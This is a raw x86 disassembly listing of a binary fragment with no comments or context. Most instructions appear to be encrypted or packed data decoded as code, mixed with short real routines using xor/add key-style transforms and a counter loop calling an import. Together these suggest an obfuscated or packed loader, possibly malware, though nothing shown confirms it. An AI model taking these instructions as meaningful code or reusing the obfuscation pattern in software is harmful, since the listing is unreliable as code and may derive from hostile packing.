  40c49b:	add    ebx,DWORD PTR [ebx+0x7e871933]
  40c4a1:	jle    0x40c4d1
  40c4a3:	jge    0x40c523
  40c4a5:	jle    0x40c4a7
  40c4a7:	xchg   ebp,eax
  40c4a8:	mov    bl,0xc9
  40c4aa:	cld    
  40c4ab:	sub    ebp,DWORD PTR [ecx]
  40c4ad:	js     0x40c440
  40c4af:	push   edi
  40c4b0:	rcl    BYTE PTR [ecx+0x21],cl
  40c4b3:	mov    al,0xe6
  40c4b5:	leave  
  40c4b6:	adc    al,0x78
  40c4b8:	pushf  
  40c4b9:	das    
  40c4ba:	jmp    0xf4ae:0xc5b71401
  40c4c1:	jae    0x40c4fe
  40c4c3:	xchg   esp,eax
  40c4c4:	push   0xffffffd6
  40c4c6:	mov    dl,dh
  40c4c8:	mov    eax,0x461388b
  40c4cd:	pop    ss
  40c4ce:	mov    dh,0x2
  40c4d0:	mov    dh,0xbe
  40c4d2:	xlat   BYTE PTR ds:[ebx]
  40c4d3:	out    dx,al
  40c4d4:	jmp    DWORD PTR [esi+0x28]
  40c4d7:	cmc    
  40c4d8:	(bad)
  40c4dc:	fisub  WORD PTR [edi]
  40c4de:	push   eax
  40c4df:	cdq    
  40c4e0:	in     eax,dx
  40c4e1:	dec    ebx
  40c4e2:	fs jle 0x40c4bd
  40c4e5:	jp     0x40c480
  40c4e7:	dec    edi
  40c4e8:	push   edi
  40c4e9:	jno    0x40c4b0
  40c4eb:	out    0xf1,al
  40c4ed:	neg    BYTE PTR ds:0x4ba56caf
  40c4f3:	fbstp  TBYTE PTR [esi+0x5d]
  40c4f6:	or     DWORD PTR [edi+0x16],ecx
  40c4f9:	cmp    dh,BYTE PTR [esi-0x21]
  40c4fc:	cmp    bh,dh
  40c4fe:	out    dx,eax
  40c4ff:	sub    DWORD PTR [edx+esi*2+0x1d],ebx
  40c503:	ret    
  40c504:	pushf  
  40c505:	jp     0x40c4d8
  40c507:	mov    cl,BYTE PTR [eax-0x29]
  40c50a:	popf   
  40c50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c50c:	out    dx,al
  40c50d:	inc    edx
  40c50e:	imul   ebx,DWORD PTR [eax],0x94102f1b
  40c514:	inc    edx
  40c515:	punpckhbw mm2,mm1
  40c518:	stos   DWORD PTR es:[edi],eax
  40c519:	mov    edx,gs
  40c51b:	dec    ebp
  40c51c:	aas    
  40c51d:	pop    ebp
  40c51e:	jae    0x40c55a
  40c520:	dec    esi
  40c521:	add    BYTE PTR [edi+edx*2+0x70],ah
  40c525:	sbb    edx,DWORD PTR [esi+0x5b467b3]
  40c52b:	pop    edi
  40c52c:	or     DWORD PTR [eax+0x75],eax
  40c52f:	lock lock jo 0x40c4f8
  40c533:	leave  
  40c534:	or     edx,DWORD PTR [edx]
  40c536:	fsubr  QWORD PTR [ebx-0x5b]
  40c539:	call   0x3fbe1dd6
  40c53e:	icebp  
  40c53f:	mov    bh,0x6f
  40c541:	scas   al,BYTE PTR es:[edi]
  40c542:	call   0xba1e:0xbe192848
  40c549:	arpl   WORD PTR [eax],cx
  40c54b:	xchg   edi,eax
  40c54c:	push   ebp
  40c54d:	fild   WORD PTR [edi+0x13]
  40c550:	or     esi,ecx
  40c552:	lods   eax,DWORD PTR ds:[esi]
  40c553:	mov    WORD PTR [ecx+0x35c91b12],cs
  40c559:	mul    ah
  40c55b:	ret    0x7484
  40c55e:	mov    edi,ecx
  40c560:	and    eax,0x379a16d7
  40c565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c566:	dec    ecx
  40c567:	call   0x67fb:0xdedabdd1
  40c56e:	inc    ecx
  40c56f:	xor    al,0xc4
  40c571:	jae    0x40c595
  40c573:	lock fisttp QWORD PTR [esi-0x60]
  40c577:	jno    0x40c52f
  40c579:	cmp    al,0x74
  40c57b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c57c:	popa   
  40c57d:	test   DWORD PTR [ecx+ecx*4+0x4],esp
  40c581:	push   es
  40c582:	ja     0x40c53f
  40c584:	lock add BYTE PTR [ebx*2+0x14600519],dh
  40c58c:	fistp  DWORD PTR [ebp+0x68d38b38]
  40c592:	push   ss
  40c593:	mov    ah,0x36
  40c595:	and    eax,0x7a7d3857
  40c59a:	bound  esi,QWORD PTR [edx+edx*2+0x6bccbbfb]
  40c5a1:	push   es
  40c5a2:	mov    bh,0x6
  40c5a4:	or     eax,0xaa85850f
  40c5a9:	aaa    
  40c5aa:	(bad)  
  40c5ab:	in     eax,0xd7
  40c5ad:	sar    BYTE PTR [edi+0x5798439e],1
  40c5b3:	not    ah
  40c5b5:	inc    edi
  40c5b6:	push   eax
  40c5b7:	xchg   ebx,eax
  40c5b8:	ret    
  40c5b9:	dec    ecx
  40c5ba:	push   0xe4dc2851
  40c5bf:	jmp    0x40c568
  40c5c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5c2:	mov    cl,0x35
  40c5c4:	jl     0x40c633
  40c5c6:	imul   eax,DWORD PTR [esi-0x31],0xffffff99
  40c5ca:	push   ebx
  40c5cb:	das    
  40c5cc:	in     al,dx
  40c5cd:	push   edi
  40c5ce:	jge    0x40c63a
  40c5d0:	xchg   edi,eax
  40c5d1:	dec    ecx
  40c5d2:	fsubr  DWORD PTR [eax]
  40c5d4:	cmp    al,0x1f
  40c5d6:	dec    esp
  40c5d7:	in     eax,dx
  40c5d8:	stos   BYTE PTR es:[edi],al
  40c5d9:	mov    ds:0x2d154c90,eax
  40c5de:	adc    eax,0x4a4c661a
  40c5e3:	xchg   sp,ax
  40c5e5:	xor    al,BYTE PTR ds:0x1e717afa
  40c5eb:	xor    al,0x84
  40c5ed:	das    
  40c5ee:	cmp    esp,DWORD PTR [ecx+edx*4-0x10e50429]
  40c5f5:	dec    esi
  40c5f6:	push   es
  40c5f7:	or     DWORD PTR [ebx],esp
  40c5f9:	pop    edx
  40c5fa:	mov    esp,0x94bfe15d
  40c5ff:	or     al,0x78
  40c601:	in     eax,0xf6
  40c603:	push   edx
  40c604:	aad    0x93
  40c606:	fnstcw WORD PTR gs:[ebx+ebp*2+0x616ec245]
  40c60e:	push   es
  40c60f:	inc    esi
  40c610:	hlt    
  40c611:	lds    esi,FWORD PTR [esi+0xebccd93]
  40c617:	xor    DWORD PTR [esi+ecx*4-0x57],edi
  40c61b:	jbe    0x40c5d8
  40c61d:	js     0x40c5aa
  40c61f:	xchg   ebp,eax
  40c620:	xlat   BYTE PTR ds:[ebx]
  40c621:	mov    bh,0x3d
  40c623:	neg    BYTE PTR [edi+0x7b]
  40c626:	(bad)  
  40c627:	cmp    ah,bh
  40c629:	mov    ds:0xb9a2b09e,eax
  40c62e:	ins    BYTE PTR es:[edi],dx
  40c62f:	sub    al,0x57
  40c631:	sub    edx,DWORD PTR [esi]
  40c633:	cmp    al,0xcc
  40c635:	lods   eax,DWORD PTR ds:[esi]
  40c636:	retf   
  40c637:	(bad)  
  40c638:	sbb    eax,0x298066b4
  40c63d:	lods   eax,DWORD PTR ds:[esi]
  40c63e:	loope  0x40c5e6
  40c640:	test   eax,0x71bfbb77
  40c645:	inc    ebx
  40c646:	push   0xffffffce
  40c648:	cmp    DWORD PTR [edi-0x47],edi
  40c64b:	xor    BYTE PTR [ecx+0x4fb91aff],0x27
  40c652:	sar    bh,cl
  40c654:	call   0xeeb8:0x7d335f5d
  40c65b:	xchg   BYTE PTR [ebx],al
  40c65d:	(bad)  
  40c65e:	cmp    ebx,DWORD PTR [edx]
  40c660:	repz xchg ebx,eax
  40c662:	ret    0xca8a
  40c665:	stos   DWORD PTR es:[edi],eax
  40c666:	cmp    eax,0x9703b2bc
  40c66b:	icebp  
  40c66c:	jb     0x40c632
  40c66e:	xlat   BYTE PTR ds:[ebx]
  40c66f:	dec    edi
  40c670:	push   ebx
  40c671:	pop    esi
  40c672:	xor    esp,DWORD PTR [esi]
  40c674:	inc    ecx
  40c675:	cdq    
  40c676:	dec    eax
  40c677:	sub    dl,BYTE PTR [edi]
  40c679:	int3   
  40c67a:	jo     0x40c6b6
  40c67c:	sbb    bh,BYTE PTR ds:0xff1c1574
  40c682:	fisubr WORD PTR [ecx+0x72]
  40c685:	add    eax,0x7303eebd
  40c68a:	mov    BYTE PTR [esp+ecx*2+0x47],cl
  40c68e:	jne    0x40c6d6
  40c690:	ror    DWORD PTR cs:0x4e932e13,1
  40c697:	push   edi
  40c698:	repnz or BYTE PTR ds:0x513b8523,al
  40c69f:	push   cs
  40c6a0:	push   0xffffffd1
  40c6a2:	or     eax,DWORD PTR [ebp-0x4343928e]
  40c6a8:	aaa    
  40c6a9:	sti    
  40c6aa:	jge    0x40c6c3
  40c6ac:	popa   
  40c6ad:	pop    edx
  40c6ae:	jle    0x40c673
  40c6b0:	(bad)  
  40c6b2:	add    eax,0xee939379
  40c6b7:	cld    
  40c6b8:	pop    ds
  40c6b9:	xchg   ebx,eax
  40c6ba:	iret   
  40c6bb:	xchg   BYTE PTR [esp+ecx*8],al
  40c6be:	adc    al,0x36
  40c6c0:	inc    ebx
  40c6c1:	inc    edi
  40c6c2:	mov    eax,0x3cd0fa00
  40c6c7:	pushaw 
  40c6c9:	std    
  40c6ca:	mov    ah,bl
  40c6cc:	add    al,0xa7
  40c6ce:	xchg   edi,eax
  40c6cf:	es cmp al,0x37
  40c6d2:	push   ds
  40c6d3:	mov    ds:0xe973c545,al
  40c6d8:	pushf  
  40c6d9:	xor    esp,DWORD PTR [ecx+0x34cdf3c0]
  40c6df:	and    BYTE PTR [ebx],bl
  40c6e1:	sahf   
  40c6e2:	rsm    
  40c6e4:	mov    eax,ds:0x8e73310e
  40c6e9:	int    0x28
  40c6eb:	jns    0x40c694
  40c6ed:	mov    edx,ecx
  40c6ef:	pop    edi
  40c6f0:	jmp    0x551b:0x208fbe61
  40c6f7:	dec    edi
  40c6f8:	clc    
  40c6f9:	fwait
  40c6fa:	inc    esp
  40c6fb:	test   DWORD PTR [eax+0x79b7e5a3],esp
  40c701:	push   ebx
  40c702:	pusha  
  40c703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c704:	adc    eax,0xcc8fa957
  40c709:	xchg   edi,eax
  40c70a:	jge    0x40c6d9
  40c70c:	leave  
  40c70d:	add    al,0x57
  40c70f:	aas    
  40c710:	test   BYTE PTR [esi-0x6d],cl
  40c713:	shl    ebp,cl
  40c715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c716:	push   0x36606589
  40c71b:	and    BYTE PTR [ecx-0x67],cl
  40c71e:	fisttp QWORD PTR [ecx-0x1e]
  40c721:	sar    DWORD PTR [esi],0xd7
  40c724:	xor    eax,0xfb0810c2
  40c729:	call   0x70ca2f77
  40c72e:	imul   DWORD PTR [esi-0x73]
  40c731:	sahf   
  40c732:	inc    eax
  40c733:	or     esp,ecx
  40c735:	je     0x40c6f9
  40c737:	adc    DWORD PTR [ecx-0x33ee1066],0x46af7915
  40c741:	pop    ss
  40c742:	or     cl,dh
  40c744:	ror    DWORD PTR [edi-0x1e],0x61
  40c748:	out    0x4a,eax
  40c74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c74b:	aad    0xeb
  40c74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c74e:	bound  eax,QWORD PTR [eax-0x5f619eda]
  40c754:	and    esp,esi
  40c756:	or     eax,ebp
  40c758:	ret    
  40c759:	repz fild QWORD PTR [eax+0x6c]
  40c75d:	pop    ds
  40c75e:	out    dx,eax
  40c75f:	es pusha 
  40c761:	adc    dl,BYTE PTR [edx]
  40c763:	out    dx,al
  40c764:	je     0x40c799
  40c766:	test   dh,dl
  40c768:	xchg   ecx,eax
  40c769:	nop
  40c76a:	mov    al,ds:0xfcc287cf
  40c76f:	ret    0x477d
  40c772:	shl    DWORD PTR [ebx+ecx*2-0x43],0xb4
  40c777:	jo     0x40c704
  40c779:	mov    esi,0xe73c0f89
  40c77f:	sub    BYTE PTR [edi+esi*8+0x7d525c59],dh
  40c786:	fs cld 
  40c788:	div    DWORD PTR [eax]
  40c78a:	xor    bh,BYTE PTR [esi-0x7d484432]
  40c790:	jmp    0x40c746
  40c792:	xchg   cl,bl
  40c794:	mov    edx,0xc8216839
  40c799:	lock test DWORD PTR [ebx-0x684884e9],ebp
  40c7a0:	ja     0x40c77b
  40c7a2:	iret   
  40c7a3:	(bad)  
  40c7a4:	xor    DWORD PTR [eax],esi
  40c7a6:	xchg   edx,eax
  40c7a7:	pop    edx
  40c7a8:	outs   dx,BYTE PTR ds:[esi]
  40c7a9:	aam    0xef
  40c7ab:	push   0x4b
  40c7ad:	push   ebp
  40c7ae:	push   ecx
  40c7af:	push   ebp
  40c7b0:	jae    0x8b1b70ff
  40c7b6:	add    al,0x54
  40c7b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7b9:	sbb    ecx,DWORD PTR ds:[ecx-0x6c]
  40c7bd:	fldenv [edx]
  40c7bf:	xor    DWORD PTR [ecx+edi*8-0x36],ecx
  40c7c3:	pop    ebx
  40c7c4:	cwde   
  40c7c5:	xchg   ebp,eax
  40c7c6:	(bad)  
  40c7c8:	out    dx,al
  40c7c9:	add    al,0x8c
  40c7cb:	out    dx,al
  40c7cc:	iret   
  40c7cd:	mov    cl,0x6f
  40c7cf:	(bad)  
  40c7d0:	retf   
  40c7d1:	out    0x9,al
  40c7d3:	daa    
  40c7d4:	xor    ebp,ebp
  40c7d6:	mov    ecx,DWORD PTR [ebp-0x8]
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	lahf   
  40c800:	(bad)  [ebp+0x5]
  40c803:	leave  
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c7d8
  40c80c:	lods   al,BYTE PTR ds:[esi]
  40c80d:	sbb    eax,0x42bf790c
  40c812:	call   0x411834fb
  40c817:	dec    esi
  40c818:	sub    DWORD PTR [esi+eax*8-0x2a],eax
  40c81c:	mov    bl,0x2e
  40c81e:	enter  0xb0c,0x39
  40c822:	aas    
  40c823:	cld    
  40c824:	mov    esp,0x9c849d78
  40c829:	test   al,0x9f
  40c82b:	mov    DWORD PTR [edi+0x6b4ce0e9],ebp
  40c831:	cli    
  40c832:	jmp    0x40c810
  40c834:	push   esp
  40c835:	inc    edx
  40c836:	xor    eax,0x21
  40c839:	mul    BYTE PTR [edx+0x37b3251d]
  40c83f:	inc    edx
  40c840:	cmovae ecx,DWORD PTR [esi+0x61683ee6]
  40c847:	aaa    
  40c848:	repz sub BYTE PTR [ebx-0x60],bh
  40c84c:	ror    edx,cl
  40c84e:	adc    DWORD PTR [ebp+ecx*8-0x65],0xba07b4b8
  40c856:	cli    
  40c857:	mov    esp,0x1de9b6e6
  40c85c:	jmp    0xae5d:0x7a7222d
  40c863:	fistp  DWORD PTR [si-0x5a60]
  40c868:	or     eax,0x4d80b423
  40c86d:	pop    esp
  40c86e:	push   0xffffffe4
  40c870:	push   ebp
  40c871:	cwde   
  40c872:	jnp    0x40c84f
  40c874:	out    dx,eax
  40c875:	dec    ecx
  40c876:	sti    
  40c877:	pop    ss
  40c878:	data16 mov al,ds:0x475e87b2
  40c87e:	pusha  
  40c87f:	sbb    BYTE PTR [ebx+0x35],ah
  40c882:	or     al,0x4c
  40c884:	inc    esp
  40c885:	(bad)  
  40c886:	mov    eax,0x15ff4fad
  40c88b:	push   ecx
  40c88c:	or     al,0x19
  40c88e:	mov    ebp,0x6e2ba50c
  40c893:	popa   
  40c894:	rol    ah,0x23
  40c897:	stos   DWORD PTR es:[edi],eax
  40c898:	xchg   ebp,eax
  40c899:	not    BYTE PTR cs:[esi]
  40c89c:	mov    ah,0x33
  40c89e:	push   ecx
  40c89f:	adc    DWORD PTR ds:0x50fd6ac2,ecx
  40c8a5:	std    
  40c8a6:	stos   DWORD PTR es:[edi],eax
  40c8a7:	mov    ch,0xf7
  40c8a9:	xor    BYTE PTR [edx+edi*1],0x4e
  40c8ad:	mov    ebx,0x591cb142
  40c8b2:	into   
  40c8b3:	push   edx
  40c8b4:	mov    dh,0xf1
  40c8b6:	inc    edi
  40c8b7:	mov    eax,0xaa040a20
  40c8bc:	aaa    
  40c8bd:	pop    ebx
  40c8be:	std    
  40c8bf:	add    bl,ah
  40c8c1:	pop    ebp
  40c8c2:	pop    esi
  40c8c3:	sar    BYTE PTR [esi],1
  40c8c5:	out    0xa5,eax
  40c8c7:	dec    edi
  40c8c8:	xchg   esi,eax
  40c8c9:	in     al,0x9e
  40c8cb:	in     eax,dx
  40c8cc:	cmp    BYTE PTR [edi-0x5d36b19b],al
  40c8d2:	shl    DWORD PTR [edi+0x62f499d3],0x3
  40c8d9:	cmp    edx,DWORD PTR [eax-0x4ea4728d]
  40c8df:	adc    eax,0xeae8d408
  40c8e4:	aam    0xf8
  40c8e6:	pop    esp
  40c8e7:	mov    ebp,0x2028bf5e
  40c8ec:	imul   edi,ebx,0x16cc0e24
  40c8f2:	xor    DWORD PTR [eax-0x57],ebx
  40c8f5:	cdq    
  40c8f6:	sbb    al,0xbd
  40c8f8:	shr    BYTE PTR [eax],cl
  40c8fa:	and    ch,0xf9
  40c8fd:	out    0xc9,eax
  40c8ff:	jns    0x40c8f2
  40c901:	or     DWORD PTR [eax],ecx
  40c903:	jle    0x40c8aa
  40c905:	push   0x3b
  40c907:	mov    edi,0x780d777c
  40c90c:	fist   WORD PTR [ecx]
  40c90e:	push   0xfffffff7
  40c910:	mov    cl,0xf7
  40c912:	xor    bl,ch
  40c914:	dec    edx
  40c915:	lea    edx,[ecx]
  40c917:	ins    BYTE PTR es:[edi],dx
  40c918:	outs   dx,BYTE PTR ds:[esi]
  40c919:	pop    edx
  40c91a:	jo     0x40c8d8
  40c91c:	adc    ebp,DWORD PTR [edi-0x3fc750f0]
  40c922:	cmp    eax,0xcbe135e
  40c927:	aad    0x63
  40c929:	lea    ecx,[eax+0x5b]
  40c92c:	ds jne 0x40c8d1
  40c92f:	xor    DWORD PTR [edx+0xe8dcf2f],ebp
  40c935:	aam    0xf0
  40c937:	psrlq  mm3,mm1
  40c93a:	pop    ecx
  40c93b:	inc    ecx
  40c93c:	pop    edi
  40c93d:	inc    ecx
  40c93e:	xchg   esp,eax
  40c93f:	pop    es
  40c940:	fs enter 0xc3f7,0xe3
  40c945:	call   0xc7d4e37d
  40c94a:	repz xlat BYTE PTR ds:[ebx]
  40c94c:	mov    bh,0x18
  40c94e:	inc    ecx
  40c94f:	pop    edx
  40c950:	(bad)  
  40c951:	call   0x2eadd46a
  40c956:	add    ecx,DWORD PTR [ecx+0x8ad72f]
  40c95c:	cmp    DWORD PTR [esp+edx*4-0x18cb510a],ecx
  40c963:	retf   0x79f3
  40c966:	or     BYTE PTR [edi],0xb0
  40c969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c96a:	ret    0xe2a0
  40c96d:	push   ss
  40c96e:	cmp    eax,DWORD PTR [esi+eax*8]
  40c971:	(bad)  
  40c972:	adc    eax,0x6f4f2687
  40c977:	dec    edi
  40c978:	inc    edi
  40c979:	sahf   
  40c97a:	xchg   edx,eax
  40c97b:	add    esi,DWORD PTR [edi+0x753b539a]
  40c981:	jmp    0x40c9e8
  40c983:	push   0xf12f06d5
  40c988:	jne    0x40c925
  40c98a:	sbb    eax,0xd9c790ed
  40c98f:	ret    
  40c990:	std    
  40c991:	pop    ds
  40c992:	inc    esi
  40c993:	inc    ebp
  40c994:	add    ch,0x31
  40c997:	popf   
  40c998:	push   ebp
  40c999:	sbb    BYTE PTR [esi+ecx*1+0x7a],0x3d
  40c99e:	jl     0x40c979
  40c9a0:	push   edi
  40c9a1:	stos   BYTE PTR es:[edi],al
  40c9a2:	call   0xa4ea:0x4b874bca
  40c9a9:	(bad)  
  40c9aa:	in     eax,dx
  40c9ab:	pop    ecx
  40c9ac:	ror    BYTE PTR [edx+0x3e815c63],1
  40c9b2:	es sbb ecx,ecx
  40c9b5:	push   esi
  40c9b6:	sti    
  40c9b7:	ja     0x40c996
  40c9b9:	aas    
  40c9ba:	ds (bad) 
  40c9bc:	ret    
  40c9bd:	std    
  40c9be:	jecxz  0x40ca20
  40c9c0:	ja     0x40c9c1
  40c9c2:	popf   
  40c9c3:	fs sahf 
  40c9c5:	adc    DWORD PTR [ecx-0x44],eax
  40c9c8:	neg    ebp
  40c9ca:	inc    eax
  40c9cb:	iret   
  40c9cc:	aam    0x1f
  40c9ce:	mov    ds:0xe6570354,al
  40c9d3:	cmp    BYTE PTR [esi-0x7a48506c],0xed
  40c9da:	push   0x50
  40c9dc:	test   al,0x3d
  40c9de:	or     eax,0xba88bac
  40c9e3:	cmp    eax,0x6066a315
  40c9e8:	je     0x40ca56
  40c9ea:	lods   eax,DWORD PTR ds:[esi]
  40c9eb:	sub    BYTE PTR [ecx+0x6b],0xd9
  40c9ef:	pop    esp
  40c9f0:	out    dx,al
  40c9f1:	push   0xfb041889
  40c9f6:	jb     0x40c9fb
  40c9f8:	adc    al,0x31
  40c9fa:	fdivr  QWORD PTR [eax+0x105013f9]
  40ca00:	sub    eax,DWORD PTR [edi-0x2e]
  40ca03:	xchg   BYTE PTR [eax+0x4fe42a34],ah
  40ca09:	call   0x1ed1a63f
  40ca0e:	or     edx,edx
  40ca10:	addr16 inc ebx
  40ca12:	pop    edi
  40ca13:	retf   0xfcc4
  40ca16:	fsub   QWORD PTR [ecx-0x7]
  40ca19:	or     BYTE PTR [esi-0x7ce4ce80],0xed
  40ca20:	clc    
  40ca21:	popa   
  40ca22:	pop    esi
  40ca23:	sbb    dl,dh
  40ca25:	fimul  WORD PTR [eax+0x342a1a0e]
  40ca2b:	lahf   
  40ca2c:	pop    ebx
  40ca2d:	push   cs
  40ca2e:	sub    bl,dl
  40ca30:	lods   eax,DWORD PTR ds:[esi]
  40ca31:	div    DWORD PTR [edi]
  40ca33:	jg     0x40ca4a
  40ca35:	inc    ecx
  40ca36:	sub    DWORD PTR [esi],eax
  40ca38:	mov    al,ds:0x42941cc5
  40ca3d:	and    ah,BYTE PTR [ebx-0x62a41fc0]
  40ca43:	xchg   esi,eax
  40ca44:	jecxz  0x40ca97
  40ca46:	or     BYTE PTR [esi-0x1082c80c],0x68
  40ca4d:	pop    ecx
  40ca4e:	das    
  40ca4f:	rcl    DWORD PTR [eax-0x3d],0x24
  40ca53:	stos   BYTE PTR es:[edi],al
  40ca54:	push   0xffffff80
  40ca56:	test   al,0x45
  40ca58:	bound  eax,QWORD PTR [ebp+0x34f0f6e5]
  40ca5e:	ret    
  40ca5f:	out    0xb0,al
  40ca61:	lock fadd DWORD PTR [esi+0x288332c8]
  40ca68:	dec    ebp
  40ca69:	sub    BYTE PTR [ebx],dl
  40ca6b:	sub    al,0xa
  40ca6d:	mov    edx,0xe39aa357
  40ca72:	fs sahf 
  40ca74:	mov    ebp,0x2d91eb1e
  40ca79:	push   ebx
  40ca7a:	ret    
  40ca7b:	add    edi,ebp
  40ca7d:	sub    DWORD PTR [ecx],ebx
  40ca7f:	push   0x7b
  40ca81:	repz (bad) 
  40ca83:	push   ds
  40ca84:	rcl    BYTE PTR [esi+ebx*8],cl
  40ca87:	daa    
  40ca88:	sbb    cl,BYTE PTR [ebp-0x7b]
  40ca8b:	pop    ebp
  40ca8c:	int3   
  40ca8d:	retf   
  40ca8e:	repz call 0x15bd57ef
  40ca94:	sahf   
  40ca95:	and    al,0x8
  40ca97:	shl    esp,1
  40ca99:	push   ebp
  40ca9a:	add    al,0xd1
  40ca9c:	out    0x5c,al
  40ca9e:	clc    
  40ca9f:	test   al,0xb2
  40caa1:	or     DWORD PTR [ebx+eax*4-0x1d],esi
  40caa5:	out    0x84,al
  40caa7:	sbb    BYTE PTR [ebx+0x69],dl
  40caaa:	mov    eax,0xcde628ea
  40caaf:	ror    BYTE PTR [eax+0x33],0xd3
  40cab3:	lea    ecx,[edi+0x35a61252]
  40cab9:	jns    0x40ca58
  40cabb:	popf   
  40cabc:	cli    
  40cabd:	mov    eax,ds:0x3696a419
  40cac2:	cmp    eax,0xa33f5687
  40cac7:	push   eax
  40cac8:	cld    
  40cac9:	adc    BYTE PTR [ebp-0x6b697d87],0x38
  40cad0:	cmp    BYTE PTR [eax],bh
  40cad2:	pop    esi
  40cad3:	cmp    eax,0x101fa439
  40cad8:	imul   ebx,edx,0xdfa3c84
  40cade:	sub    DWORD PTR [ecx-0x6e],esp
  40cae1:	push   edi
  40cae2:	sub    al,0x2d
  40cae4:	fs out 0x17,eax
  40cae7:	in     al,dx
  40cae8:	fwait
  40cae9:	lock loopne 0x40cabc
  40caec:	dec    ebx
  40caed:	push   0xffffff86
  40caef:	out    0xed,eax
  40caf1:	xchg   ebx,eax
  40caf2:	or     DWORD PTR [esi-0x19e2078f],esp
  40caf8:	call   0x6791:0x64f0e601
  40caff:	je     0x40cb10
  40cb01:	outs   dx,DWORD PTR ds:[esi]
  40cb02:	sub    al,0x1e
  40cb04:	push   ds
  40cb05:	fistp  DWORD PTR [esp+edi*2]
  40cb08:	jmp    0x3f0a60b2
  40cb0d:	push   cs
  40cb0e:	cmp    ebx,DWORD PTR [ebp-0x78]
  40cb11:	scas   eax,DWORD PTR es:[edi]
  40cb12:	shr    BYTE PTR [edx+0x3aea142],cl
  40cb18:	xor    BYTE PTR [esi],bh
  40cb1a:	sub    DWORD PTR [edi+esi*1+0x64846057],esi
  40cb21:	and    BYTE PTR [edx-0x6b],ch
  40cb24:	lods   eax,DWORD PTR ds:[esi]
  40cb25:	cmp    al,0x99
  40cb27:	imul   eax,DWORD PTR [edx+eax*4],0x24
  40cb2b:	jae    0x40caf5
  40cb2d:	xchg   ebx,eax
  40cb2e:	inc    ebx
  40cb2f:	jae    0x40cb96
  40cb31:	out    dx,eax
  40cb32:	scas   eax,DWORD PTR es:[edi]
  40cb33:	sub    ah,ah
  40cb35:	and    ch,bh
  40cb37:	pop    esp
  40cb38:	mov    al,0x9e
  40cb3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb3b:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb3e:	xor    eax,esi
  40cb40:	add    eax,edi
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x4303d5,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x4303d5
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x4303d5,eax
  40cbe0:	cmp    DWORD PTR ds:0x4303d5,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x4303d5,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42e98b
  40cc05:	cmp    DWORD PTR ds:0x4303d5,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x4303d5
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x4303d5,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x4303bd,0x0
